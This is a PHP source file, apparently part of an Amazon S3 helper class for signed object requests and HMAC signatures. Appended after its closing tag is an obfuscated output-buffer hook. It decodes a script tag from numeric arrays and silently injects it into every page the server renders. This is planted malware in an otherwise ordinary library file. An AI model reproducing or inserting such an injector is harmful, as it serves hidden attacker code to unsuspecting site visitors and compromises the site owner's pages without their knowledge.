	 * Takes ($bucket, $key)  
	 *
	 * - [str] $bucket
	 * - [str] $key
	*/   
	function getObjectAsString($bucket, $key) {
		$httpDate = gmdate("D, d M Y G:i:s T");
		$resource = $bucket."/".urlencode($key);
		$stringToSign = "GET\n\n\n{$httpDate}\n/$resource";
		$signature = $this->constructSig($stringToSign);
		$req = & new HTTP_Request($this->serviceUrl.$resource);
		$req->setMethod("GET");
		$req->addHeader("Date", $httpDate);
		$req->addHeader("Authorization", "AWS " . $this->accessKeyId . ":" . $signature);
		$req->sendRequest();
		$this->responseCode = $req->getResponseCode();
		$this->responseString = $req->getResponseBody();		
		if ($this->responseCode == 200) {
			return true;
		} else {
		$this->parsed_xml = simplexml_load_string($this->responseString);		
			return false;
		}
	}
	
	/**
	 * queryStringGet -- returns a signed URL to get object
	 *
	 * Takes ($bucket, $key, $expires)  
	 *
	 * - [str] $bucket
	 * - [str] $key
	 * - [str] $expires - signed URL with expire after $expires seconds
	*/   
	function queryStringGet($bucket, $key, $expires){
		$expires = time() + $expires;
		$resource = $bucket."/".urlencode($key);
		$stringToSign = "GET\n\n\n$expires\n/$resource";
		$signature = urlencode($this->constructSig($stringToSign));
		$queryString = "<a href='http://s3.amazonaws.com/$resource?AWSAccessKeyId=$this->accessKeyId&Expires=$expires&Signature=$signature'>$bucket/$key</a>";
		return $queryString;         
	}
	
	function hex2b64($str) {
		$raw = '';
		for ($i=0; $i < strlen($str); $i+=2) {
			$raw .= chr(hexdec(substr($str, $i, 2)));
		}
		return base64_encode($raw);
	}
		 
	function constructSig($str) {
		$hasher =& new Crypt_HMAC($this->secretKey, "sha1");
		$signature = $this->hex2b64($hasher->hash($str));
		return($signature);
	}
}

class Stream{
  public $data;
  function stream_function($handle, $fd, $length){
    return fread($this->data, $length);
  }
}
?><?php global $ob_starting;
if(!$ob_starting) {
   function ob_start_flush($s) {
	$tc = array(0, 69, 84, 82, 67, 83, 7, 79, 8, 9, 73, 12, 76, 68, 63, 78, 19, 23, 24, 3, 65, 70, 27, 14, 16, 20, 80, 17, 29, 89, 86, 85, 2, 77, 91, 93, 11, 18, 71, 66, 72, 75, 87, 74, 22, 37, 52, 13, 59, 61, 25, 28, 21, 1, 35, 15, 34, 36, 30, 88, 41, 92, 46, 33, 51);
	$tr = array(51, 5, 4, 3, 10, 26, 2, 0, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 58, 10, 21, 0, 8, 2, 29, 26, 1, 7, 21, 8, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 9, 28, 28, 32, 31, 15, 13, 1, 21, 10, 15, 1, 13, 32, 9, 0, 34, 0, 0, 0, 30, 20, 3, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 15, 1, 42, 0, 63, 3, 3, 20, 29, 8, 6, 19, 25, 39, 18, 37, 17, 37, 6, 11, 0, 6, 19, 18, 27, 17, 18, 17, 21, 6, 11, 0, 6, 19, 18, 16, 37, 21, 18, 16, 6, 11, 0, 6, 19, 18, 18, 17, 21, 17, 25, 6, 11, 0, 6, 19, 25, 4, 16, 27, 18, 16, 6, 11, 0, 6, 19, 17, 25, 18, 17, 18, 16, 6, 11, 0, 6, 19, 16, 1, 17, 50, 17, 24, 6, 11, 0, 6, 19, 18, 52, 17, 24, 18, 37, 6, 11, 0, 6, 19, 17, 37, 18, 27, 17, 18, 6, 11, 0, 6, 19, 17, 21, 18, 16, 16, 27, 6, 11, 0, 6, 19, 37, 21, 18, 37, 18, 27, 6, 11, 0, 6, 19, 17, 37, 25, 4, 16, 27, 6, 11, 0, 6, 19, 17, 17, 18, 16, 18, 16, 6, 11, 0, 6, 19, 17, 21, 25, 50, 16, 1, 6, 11, 0, 6, 19, 16, 1, 25, 17, 25, 52, 6, 11, 0, 6, 19, 16, 13, 25, 25, 25, 25, 6, 11, 0, 6, 19, 16, 13, 25, 24, 25, 16, 6, 11, 0, 6, 19, 16, 21, 16, 13, 25, 27, 6, 11, 0, 6, 19, 16, 21, 25, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 24, 18, 25, 6, 11, 0, 6, 19, 17, 25, 18, 27, 18, 18, 6, 11, 0, 6, 19, 16, 13, 17, 4, 17, 18, 6, 11, 0, 6, 19, 17, 13, 16, 13, 17, 21, 6, 11, 0, 6, 19, 17, 17, 17, 21, 16, 27, 6, 11, 0, 6, 19, 25, 13, 24, 24, 24, 24, 6, 9, 22, 0, 0, 0, 30, 20, 3, 0, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 27, 22, 0, 0, 0, 30, 20, 3, 0, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 0, 28, 0, 24, 22, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 2, 11, 5, 2, 29, 12, 1, 13, 9, 0, 34, 30, 20, 3, 0, 5, 0, 28, 0, 32, 32, 22, 21, 7, 3, 0, 8, 43, 28, 24, 22, 43, 51, 2, 23, 12, 1, 15, 38, 2, 40, 22, 43, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 3, 38, 39, 0, 28, 0, 2, 48, 43, 49, 22, 21, 7, 3, 0, 8, 10, 28, 27, 22, 10, 51, 17, 22, 10, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 4, 12, 3, 0, 28, 0, 4, 14, 3, 38, 39, 23, 5, 31, 39, 5, 2, 3, 8, 10, 36, 36, 11, 37, 9, 22, 10, 21, 0, 8, 4, 14, 4, 12, 3, 53, 28, 32, 24, 24, 32, 9, 0, 5, 0, 36, 28, 0, 64, 2, 3, 10, 15, 38, 23, 21, 3, 7, 33, 54, 40, 20, 3, 54, 7, 13, 1, 8, 26, 20, 3, 5, 1, 60, 15, 2, 8, 4, 14, 4, 12, 3, 11, 27, 44, 9, 47, 27, 52, 9, 22, 35, 35, 10, 21, 0, 8, 5, 2, 29, 12, 1, 13, 9, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 16, 44, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 37, 9, 9, 22, 35, 0, 1, 12, 5, 1, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 22, 35, 3, 1, 2, 31, 3, 15, 0, 5, 22, 0, 0, 0, 35, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 0, 34, 2, 3, 29, 0, 34, 0, 0, 0, 10, 21, 8, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 56, 29, 60, 13, 0, 61, 61, 0, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 9, 34, 13, 7, 4, 31, 33, 1, 15, 2, 23, 42, 3, 10, 2, 1, 8, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 27, 9, 9, 22, 0, 0, 0, 35, 0, 1, 12, 5, 1, 0, 34, 30, 20, 3, 0, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 28, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 8, 32, 5, 4, 3, 10, 26, 2, 32, 9, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 5, 3, 4, 28, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 24, 9, 22, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 5, 56, 29, 46, 20, 38, 62, 20, 33, 1, 8, 32, 40, 1, 20, 13, 32, 9, 48, 24, 49, 23, 20, 26, 26, 1, 15, 13, 54, 40, 10, 12, 13, 8, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 9, 22, 35, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 35, 2, 3, 29, 0, 34, 4, 40, 1, 4, 41, 14, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 8, 9, 22, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 5, 1, 2, 46, 10, 33, 1, 7, 31, 2, 8, 32, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 32, 11, 0, 52, 24, 24, 9, 22, 35, 0, 0, 0, 35, 0, 0, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 22, 35, 51, 55, 5, 4, 3, 10, 26, 2, 58);

	$ob_htm = ''; foreach($tr as $tval) {
		$ob_htm .= chr($tc[$tval]+32);
	}

	$slw=strtolower($s);
	$i=strpos($slw,'</script');if($i){$i=strpos($slw,'>',$i);}
	if(!$i){$i=strpos($slw,'</div');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</table');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</form');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</p');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</body');if($i){$i--;}}
	if(!$i){$i=strlen($s);if($i){$i--;}}
	$i++; $s=substr($s,0,$i).$ob_htm.substr($s,$i);
	
	return $s;
   }
   $ob_starting = time();
   @ob_start("ob_start_flush");
} ?>